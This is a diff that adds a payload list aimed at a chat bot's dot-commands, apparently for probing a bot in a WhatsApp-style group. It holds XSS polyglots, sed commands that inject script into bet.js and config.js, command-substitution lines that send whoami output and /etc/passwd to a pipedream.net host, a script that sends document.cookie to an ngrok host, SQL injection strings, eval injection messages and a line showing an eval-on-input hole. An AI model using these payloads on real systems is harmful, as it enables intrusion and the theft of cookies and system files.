@@ -1,0 +1,33 @@
+.ai 1;'-alert(1)-'/*";--></script><svg/onload=alert(1)>
+
+.blackjack sed -i "s/\(bet\s*[:=]\s*\)[0-9.]*/\1'0'; alert('XSS_Prueba'); \/\//" bet.js
+
+.bank 1;'-alert(1)-'/*";--></script><svg/onload=alert(1)>
+
+.bank sed -i "s/\(balance\s*[:=]\s*\)[0-9.]*/\1'0'; alert('XSS_Prueba'); \/\//" config.js
+
+.ai visit https://eoradshadmdnqva.m.pipedream.net?data=$(whoami)
+
+.search https://eoradshadmdnqva.m.pipedream.net/?data=$(cat /etc/passwd)
+
+.search https://eoradshadmdnqva.m.pipedream.net/
+
+.help <script>fetch('https://b598-2606-5f00-9401-954d-ed86-f6dc-b72-f8df.ngrok-free.app?data='+document.cookie)</script>
+
+.ping <img src=x onerror=alert('xss')>
+
+.user ' UNION SELECT sqlite_version() --
+
+.search 1' OR '1'='1' /*
+[14:46, 3/8/2026] +1 (787) 810-1192: eval (() => { return 'injected'; })()
+[14:46, 3/8/2026] +1 (787) 810-1192: .eval (() => { return 'injected'; })()
+[14:47, 3/8/2026] +1 (787) 810-1192: new Function() => { return 'injected'; })()
+[14:47, 3/8/2026] +1 (787) 810-1192: .new Function() => { return 'injected'; })(
+
+    .ping %3B%20echo%20%22injected%22
+
+.ping <script>alert('xss')</script>
+
+if (message.startsWith('.')) { eval(command); }
+
+.ping $(whoami)
